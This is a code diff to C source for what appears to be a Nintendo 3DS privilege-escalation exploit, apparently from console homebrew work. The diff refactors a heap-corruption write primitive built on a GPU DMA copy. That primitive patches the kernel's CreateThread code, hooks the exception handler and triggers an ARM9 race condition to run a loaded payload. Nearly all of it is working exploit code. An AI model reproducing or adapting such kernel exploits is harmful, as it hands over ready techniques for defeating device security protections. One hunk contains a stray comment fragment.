@@ -43,44 +43,13 @@ int do_gshax_copy(void *dst, void *src, unsigned int len) {
 	return 0;
 }
 
-int heap0_get_diff() {
-	u32 *linmem = linearMemAlign(0x10000, 0x10000);
-	
-	u32 buf1, buf2, dmy;
-	u32 bkp1[8], bkp2[8];
-	int i;
-
-	// alloc 2 bufs	
-	svcControlMemory(&buf1, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
-	svcControlMemory(&buf2, buf1+0x2000, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);	
-
-	// free 2nd and bkp heap struct
-	svcControlMemory(&dmy, buf2, 0, 0x2000, MEMOP_FREE, 0);
-	do_gshax_copy(linmem, buf2, sizeof(bkp2));
-	memcpy(&bkp2, linmem, sizeof(bkp2));
-	
-	// free 1st and bkp heap struct
-	svcControlMemory(&dmy, buf1, 0, 0x2000, MEMOP_FREE, 0);
-	do_gshax_copy(linmem, buf1, sizeof(bkp1));
-	memcpy(&bkp1, linmem, sizeof(bkp1));
-	
-	linearFree(linmem);
-
-	// diff
-	/*
-	for(i=0;i<sizeof(bkp1)/sizeof(u32);i++)
-		printf("%02X: %08X - %08X\n", i, bkp2[i], bkp1[i]);
-	*/
-	return bkp1[0] - bkp2[0];
-}
-
-// TODO?: replace with osGetFirmVersion() and osGetKernelVersion()
-u32 get_kernel_version() {
-	return *(u32 *)VA_KERNEL_VERSION_REGISTER;
-}
-
+/* fills 'data' with information that depends the model and firmware
+   version that the exploit is run on
+   
+   returns: 0 on failure, 1 on success
+*/ 
 int get_exploit_data(struct exploit_data *data) {
-	u32 kversion = 0;    
+	u32 fversion = 0;    
 	u8  isN3DS = 0;
 	s32 i;
 	s32 result = 0;
@@ -89,19 +58,55 @@ int get_exploit_data(struct exploit_data *data) {
 	if(!data)
 		return result;
 	
-	kversion = get_kernel_version();
+	fversion = osGetFirmVersion();
 	APT_CheckNew3DS(NULL, &isN3DS);
 	sysmodel = isN3DS ? SYS_MODEL_NEW_3DS : SYS_MODEL_OLD_3DS;
 	
+	/* attempt to find out whether the exploit supports 'our'
+	   current 3DS model and FIRM version */
 	for(i=0; i < sizeof(supported_systems)/sizeof(supported_systems[0]); i++) {
-		if (supported_systems[i].kernel_version == kversion &&
+		if (supported_systems[i].firm_version == fversion &&
 			supported_systems[i].sys_model & sysmodel) {
 				memcpy(data, &supported_systems[i], sizeof(struct exploit_data));
 				result = 1;
 				break;
-			}
+		}
 	}
 	return result;
+}
+
+   to write a certain value to 'address'
+*/
+void priv_write_four(u32 address) {
+	u32 saved_heap[8];
+	u32 tmp_addr;
+	u32 mem_hax_mem;
+
+	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
+	u32 mem_hax_mem_free = mem_hax_mem + 0x1000;
+	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); 
+
+	// back up heap
+	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);
+	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));
+
+	// set up a custom heap ctrl structure
+	arm11_buffer[0] = 1;
+	arm11_buffer[1] = address - 8; // prev_free_blk at offs 8
+	arm11_buffer[2] = 0;
+	arm11_buffer[3] = 0;
+
+	// corrupt heap ctrl structure by overwriting it with our custom struct
+	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 4 * sizeof(u32));
+	
+	// Trigger write to 'address' 
+	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);
+   
+	// restore heap
+	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
+	do_gshax_copy(mem_hax_mem, arm11_buffer, 4 * sizeof(u32));
+	
+	return;	
 }
 
 /* Corrupts ARM11 kernel code (CreateThread()) in order to
@@ -111,51 +116,22 @@ int corrupt_arm11_kernel_code(void) {
 	int i;
 	int (*nop_func)(void);
 	int *ipc_buf;
-	int diff;
-	u32 saved_heap[8];
-	volatile u32 hax;
-	u32 tmp_addr;
-	u32 mem_hax_mem;
 	
-		
-	// TODO ;-)
-	diff = heap0_get_diff();
-
+	// get system dependent data required for the exploit		
 	if (!get_exploit_data(&ed)) {
 		return 0;		
 	}
 
-	// data required by ARM11 kernel code
+	// copy system dependent data required by the exploit's ARM11 kernel code
 	arm11shared.va_hook1_ret = ed.va_hook1_ret;
 	arm11shared.va_pdn_regs = ed.va_pdn_regs;
 	arm11shared.va_pxi_regs = ed.va_pxi_regs;
 
-	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
-	u32 mem_hax_mem_free = mem_hax_mem + 0x1000;
-	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); 
+	// corrupt certain part of the svcCreateThread() kernel code
+	priv_write_four(ed.va_patch_createthread);
 
-	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);
-	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));
-	saved_heap[0] += diff;
-
-	arm11_buffer[0] = 1;
-	arm11_buffer[1] = ed.va_patch_createthread - 8; // prev_free_blk at offs 8
-	arm11_buffer[2] = 0;
-	arm11_buffer[3] = 0;
-
-	// corrupt heap ctrl structure
-	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);
-	
-	// Trigger write to kernel. This will actually cause
-	// the CreateThread() kernel code to be corrupted 
-	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);
-   
-	// restore heap
-	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
-	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);
-
-	 // part 2: trick to clear icache
-	for (i = 0; i < sizeof(nop_slide)/sizeof(nop_slide[0]); i++) {
+	// trick to clear icache
+	for (i = 0; i < sizeof(nop_slide) / sizeof(nop_slide[0]); i++) {
 		arm11_buffer[i] = ARM_NOP;
 	}
 	arm11_buffer[i-1] = ARM_RET;
@@ -167,17 +143,29 @@ int corrupt_arm11_kernel_code(void) {
 	return 1;
 }
 
-// reads ARM9 code from a given path
+/* reads ARM9 payload from a given path.
+   filename - full path of payload
+   buf - ptr to a global buffer that will hold the entire payload
+   buf_size - size of the 'buf' variable
+   out_size - will contain the payload's actual size
+
+   returns: 0 on failure, 1 on success
+   
+   payload must be aligned to a 4 byte boundary and >= 8 bytes in total
+*/
 int load_arm9_payload(char *filename, void *buf, u32 buf_size, u32 *out_size) {
 	int result = 0;
 	u32 fsize = 0;
+	
+	if ((!filename) || (!buf) || (!buf_size) || (!out_size))
+		return result; 
 	
 	FILE *f = fopen(filename, "rb");
 	if (f) {
 		fseek(f , 0, SEEK_END);
 		fsize = ftell(f);
 		rewind(f);
-		if (fsize && !(fsize % 4) && (fsize < buf_size)) {
+		if (fsize>=8 && !(fsize % 4) && (fsize < buf_size)) {
 				u32 bytes_read = fread(buf, 1, fsize, f);
 				if (bytes_read == fsize) {
 					*out_size = fsize;
@@ -254,7 +242,9 @@ void exploit_arm9_race_condition() {
 	/* copy ARM9 payload to FCRAM */
 	map_arm9_payload();
 
-	// patch ARM11 kernel	 
+	/* patch ARM11 kernel to force it to execute
+	   our code (hook1 and hook2) as soon as a
+	   "firmlaunch" is triggered */ 	 
 	redirect_codeflow(ed.va_exc_handler_base_X +
 	                  OFFS_EXC_HANDLER_UNUSED,
 	                  ed.va_patch_hook1);
@@ -266,7 +256,7 @@ void exploit_arm9_race_condition() {
 	CleanEntireDataCache();
 	InvalidateEntireInstructionCache();
 
-	// trigger ARM9 code execution
+	// trigger ARM9 code execution through "firmlaunch"
 	_KernelSetState(0, 0, 2, 0);	
 }
 
@@ -300,8 +290,12 @@ apply_patches (bool heal_svc_handler) {
 int __attribute__((naked))
 launch_privileged_code (void) {
 	asm volatile ("add sp, sp, #8\t\n");
+	
+	// repair CreateThread() but don't patch SVC handler
 	apply_patches (false);
+	// acquire ARM9 code execution
 	exploit_arm9_race_condition();
+	
 	asm volatile ("movs r0, #0\t\n"
 			 "ldr pc, [sp], #4\t\n");
 }
@@ -334,18 +328,21 @@ int run_exploit() {
 			
 			// if present in SD root, load arm9payload.bin 
 			sd_arm9_loaded = load_arm9_payload("/arm9payload.bin",
-											&sd_arm9_buf,
-											sizeof(sd_arm9_buf),
-											&sd_arm9_size);
+			                                   &sd_arm9_buf,
+			                                   sizeof(sd_arm9_buf),
+			                                   &sd_arm9_size);
 			printf("[+] Using %s payload\n",
 					sd_arm9_loaded ? "external" : "built-in");
 			
 			printf("[+] Running payload\n");	
 			svcCorruptedCreateThread(launch_privileged_code);			
-			printf("[!] Failure :[\n");
+			printf("[!] Failure\n");
 			
 			if(is_healed_svc_handler) {
-				// svc handler has been patched...
+				/* if exploiting the ARM9 race condition did not
+				   succeed but the svc handler has been patched,
+				   we might still execute privileged ARM11 code
+				   in kernel mode */
 			}
 		}
 		else
